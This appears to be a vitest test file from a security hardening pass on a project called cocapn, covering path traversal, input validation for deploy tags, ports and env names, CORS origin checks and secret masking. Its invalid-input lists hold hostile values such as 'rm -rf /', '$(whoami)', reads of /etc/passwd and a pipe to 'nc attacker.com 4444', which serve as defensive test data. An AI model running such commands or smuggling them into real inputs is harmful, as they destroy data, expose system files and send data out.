/**
 * Security hardening tests — command injection, path traversal, CORS, input validation.
 *
 * Tests the fixes applied during the security hardening pass:
 *   1. Brain path traversal protection (readWikiPage, addWikiPage)
 *   2. Input validation (deploy tag/port/env, wiki slug)
 *   3. CORS restriction (no wildcard in production)
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import {
  mkdtempSync,
  rmSync,
  mkdirSync,
  writeFileSync,
  existsSync,
} from "fs";
import { join } from "path";
import { tmpdir } from "os";

// ─── Brain path traversal tests ─────────────────────────────────────────────
// We test the Brain class directly for path traversal protection.
// The validateRelativePath and resolveWithin helpers are private,
// so we test through the public API (readWikiPage, addWikiPage).

describe("Brain: path traversal protection", () => {
  let repoRoot: string;
  let wikiDir: string;

  beforeEach(() => {
    repoRoot = mkdtempSync(join(tmpdir(), "cocapn-brain-sec-"));
    wikiDir = join(repoRoot, "cocapn", "wiki");
    mkdirSync(wikiDir, { recursive: true });
    writeFileSync(join(wikiDir, "safe.md"), "# Safe Page\nHello world");
  });

  afterEach(() => {
    rmSync(repoRoot, { recursive: true, force: true });
  });

  // We need to create a minimal Brain instance to test.
  // Since Brain requires GitSync and BridgeConfig, we test the path
  // validation logic directly by importing and testing the pattern.

  it("readWikiPage rejects path traversal with ../", async () => {
    // Dynamically import to get access to the Brain class
    const { Brain } = await import("../src/brain/index.js");

    // Create a minimal mock setup — we just need to test the path validation
    // that happens in readWikiPage. We'll catch the error from resolveWithin.
    const brain = new Brain(repoRoot, {
      soul: "cocapn/soul.md",
      memory: { facts: "cocapn/memory/facts.json" },
      config: { mode: "local", port: 3100 },
    } as any, {
      commit: async () => {},
      pull: async () => {},
      startTimers: () => {},
      stopTimers: () => {},
      on: () => {},
    } as any);

    // Path traversal should return null (not throw, because readWikiPage catches errors)
    const result = brain.readWikiPage("../../etc/passwd");
    expect(result).toBeNull();
  });

  it("readWikiPage rejects absolute paths", async () => {
    const { Brain } = await import("../src/brain/index.js");

    const brain = new Brain(repoRoot, {
      soul: "cocapn/soul.md",
      memory: { facts: "cocapn/memory/facts.json" },
      config: { mode: "local", port: 3100 },
    } as any, {
      commit: async () => {},
      pull: async () => {},
      startTimers: () => {},
      stopTimers: () => {},
      on: () => {},
    } as any);

    const result = brain.readWikiPage("/etc/passwd");
    expect(result).toBeNull();
  });

  it("readWikiPage rejects null bytes", async () => {
    const { Brain } = await import("../src/brain/index.js");

    const brain = new Brain(repoRoot, {
      soul: "cocapn/soul.md",
      memory: { facts: "cocapn/memory/facts.json" },
      config: { mode: "local", port: 3100 },
    } as any, {
      commit: async () => {},
      pull: async () => {},
      startTimers: () => {},
      stopTimers: () => {},
      on: () => {},
    } as any);

    const result = brain.readWikiPage("safe\x00.md");
    expect(result).toBeNull();
  });

  it("readWikiPage accepts safe relative paths", async () => {
    const { Brain } = await import("../src/brain/index.js");

    const brain = new Brain(repoRoot, {
      soul: "cocapn/soul.md",
      memory: { facts: "cocapn/memory/facts.json" },
      config: { mode: "local", port: 3100 },
    } as any, {
      commit: async () => {},
      pull: async () => {},
      startTimers: () => {},
      stopTimers: () => {},
      on: () => {},
    } as any);

    const result = brain.readWikiPage("safe.md");
    expect(result).not.toBeNull();
    expect(result).toContain("Hello world");
  });

  it("addWikiPage rejects path traversal in destName", async () => {
    const { Brain } = await import("../src/brain/index.js");

    // Create a file outside the wiki dir that we don't want written to
    const outsideFile = join(repoRoot, "evil.txt");
    writeFileSync(outsideFile, "original");

    const brain = new Brain(repoRoot, {
      soul: "cocapn/soul.md",
      memory: { facts: "cocapn/memory/facts.json" },
      config: { mode: "local", port: 3100 },
    } as any, {
      commit: async () => {},
      pull: async () => {},
      startTimers: () => {},
      stopTimers: () => {},
      on: () => {},
    } as any);

    // Try to write outside the wiki directory via traversal
    const sourceFile = join(repoRoot, "source.md");
    writeFileSync(sourceFile, "content");

    await expect(
      brain.addWikiPage(sourceFile, "../../evil.txt")
    ).rejects.toThrow();

    // Verify the file outside was NOT overwritten
    expect(readFileSync(outsideFile, "utf-8")).toBe("original");
  });
});

// ─── Wiki slug validation tests ──────────────────────────────────────────────
// These test the slug validation logic used in wiki.ts

describe("Wiki slug validation", () => {
  // We test the validation pattern directly since validateSlug is not exported
  const validSlugPattern = /^[a-zA-Z0-9._-]+$/;

  const validSlugs = [
    "my-page",
    "My_Page",
    "project.overview",
    "v1.0-release",
    "getting-started",
    "api_reference",
    "test.page.name",
  ];

  const invalidSlugs = [
    "../../../etc/passwd",
    "page/with/slashes",
    "page\\with\\backslash",
    "../escape",
    "/absolute/path",
    "page with spaces",
    "page;rm -rf /",
    "page$(whoami)",
    "page`cat /etc/passwd`",
    "page\x00evil",
  ];

  it("accepts valid wiki slugs", () => {
    for (const slug of validSlugs) {
      expect(validSlugPattern.test(slug)).toBe(true);
    }
  });

  it("rejects invalid wiki slugs", () => {
    for (const slug of invalidSlugs) {
      expect(validSlugPattern.test(slug)).toBe(false);
    }
  });

  it("rejects slugs with path traversal", () => {
    const traversalSlugs = ["../escape", "..\\windows", "../../etc/passwd", "safe/../../evil"];
    for (const slug of traversalSlugs) {
      expect(slug.includes("..") || slug.includes("/") || slug.includes("\\")).toBe(true);
    }
  });
});

// ─── Deploy input validation tests ──────────────────────────────────────────

describe("Deploy input validation", () => {
  it("rejects Docker tags with shell metacharacters", () => {
    const safeTagPattern = /^[a-z0-9._:/-]+$/;

    const safeTags = ["cocapn", "my-app:v1", "registry.io/user/image:latest", "my.app-1.0"];
    const unsafeTags = [
      "my-image; rm -rf /",
      "$(whoami)",
      "`cat /etc/passwd`",
      "my-image && echo pwned",
      "my-image | nc attacker.com 4444",
    ];

    for (const tag of safeTags) {
      expect(safeTagPattern.test(tag)).toBe(true);
    }
    for (const tag of unsafeTags) {
      expect(safeTagPattern.test(tag)).toBe(false);
    }
  });

  it("rejects invalid port numbers", () => {
    const validPorts = ["80", "443", "3100", "65535"];
    const invalidPorts = ["0", "-1", "65536", "abc", "3100; echo pwned", "3100 $(whoami)"];

    for (const port of validPorts) {
      const n = parseInt(port, 10);
      expect(n >= 1 && n <= 65535).toBe(true);
    }
    for (const port of invalidPorts) {
      const n = parseInt(port, 10);
      expect(Number.isFinite(n) && n >= 1 && n <= 65535).toBe(false);
    }
  });

  it("rejects environment names with special characters", () => {
    const safeEnvPattern = /^[a-zA-Z0-9_-]+$/;

    const safeEnvs = ["production", "staging", "dev", "test-env", "v1_release"];
    const unsafeEnvs = [
      "production; rm -rf /",
      "$(whoami)",
      "prod && echo pwned",
      "env with spaces",
    ];

    for (const env of safeEnvs) {
      expect(safeEnvPattern.test(env)).toBe(true);
    }
    for (const env of unsafeEnvs) {
      expect(safeEnvPattern.test(env)).toBe(false);
    }
  });
});

// ─── Git args splitting tests (sync.ts) ──────────────────────────────────────

describe("Git args splitting (sync.ts)", () => {
  // Test the splitArgs logic used to convert string args to array for execFileSync
  function splitArgs(args: string): string[] {
    const result: string[] = [];
    let current = "";
    let inQuote = false;

    for (let i = 0; i < args.length; i++) {
      const ch = args[i]!;
      if (ch === '"') {
        inQuote = !inQuote;
        continue;
      }
      if (ch === " " && !inQuote) {
        if (current.length > 0) {
          result.push(current);
          current = "";
        }
        continue;
      }
      current += ch;
    }
    if (current.length > 0) {
      result.push(current);
    }
    return result;
  }

  it("splits simple git args", () => {
    expect(splitArgs("status --porcelain")).toEqual(["status", "--porcelain"]);
  });

  it("preserves quoted commit messages", () => {
    expect(splitArgs('commit -m "wiki: edit my-page"')).toEqual([
      "commit", "-m", "wiki: edit my-page",
    ]);
  });

  it("splits multiple args with quotes", () => {
    expect(splitArgs('log -1 --format="%s"')).toEqual([
      "log", "-1", '--format=%s',
    ]);
  });

  it("handles trailing whitespace", () => {
    expect(splitArgs("status  ")).toEqual(["status"]);
  });

  it("handles empty string", () => {
    expect(splitArgs("")).toEqual([]);
  });
});

// ─── CORS restriction tests ─────────────────────────────────────────────────

describe("CORS origin validation", () => {
  const isAllowedOrigin = (origin: string): boolean => {
    const isLocalhost = origin.startsWith("http://localhost") || origin.startsWith("http://127.0.0.1");
    const isTunnel = origin.includes(".trycloudflare.com") || origin.includes(".cfargotunnel.com") || origin.includes(".cocapn.io");
    return isLocalhost || isTunnel;
  };

  it("allows localhost origins", () => {
    expect(isAllowedOrigin("http://localhost:3100")).toBe(true);
    expect(isAllowedOrigin("http://127.0.0.1:3100")).toBe(true);
  });

  it("allows known tunnel domains", () => {
    expect(isAllowedOrigin("https://my-app.trycloudflare.com")).toBe(true);
    expect(isAllowedOrigin("https://my-app.cfargotunnel.com")).toBe(true);
    expect(isAllowedOrigin("https://my-app.cocapn.io")).toBe(true);
  });

  it("rejects unknown origins", () => {
    expect(isAllowedOrigin("https://evil.com")).toBe(false);
    expect(isAllowedOrigin("https://attacker.github.io")).toBe(false);
    expect(isAllowedOrigin("http://malicious-site.com")).toBe(false);
  });

  it("rejects origins with no match", () => {
    expect(isAllowedOrigin("https://totally-legit.example.com")).toBe(false);
  });
});

// ─── Secret masking edge cases ──────────────────────────────────────────────

describe("maskSecrets edge cases", () => {
  it("masks tokens in error messages", async () => {
    const { maskSecrets } = await import("../src/security/audit.js");

    const errorMsg = "Failed to authenticate: Bearer ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij";
    const masked = maskSecrets(errorMsg);
    expect(masked).not.toContain("ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij");
    expect(masked).toContain("Bearer ***");
  });

  it("masks API keys in environment variable dumps", async () => {
    const { maskSecrets } = await import("../src/security/audit.js");

    const dump = "DEEPSEEK_API_KEY=sk-abc123def456 OPENAI_API_KEY=sk-proj-xyz789";
    const masked = maskSecrets(dump);
    expect(masked).not.toContain("sk-abc123def456");
    expect(masked).not.toContain("sk-proj-xyz789");
  });

  it("does not mask non-secret values", async () => {
    const { maskSecrets } = await import("../src/security/audit.js");

    const safe = "NODE_ENV=production PORT=3100 MODE=local";
    expect(maskSecrets(safe)).toBe(safe);
  });
});

// Helper for the test above
function readFileSync(path: string, encoding: string): string {
  const { readFileSync: rfs } = require("fs");
  return rfs(path, encoding);
}
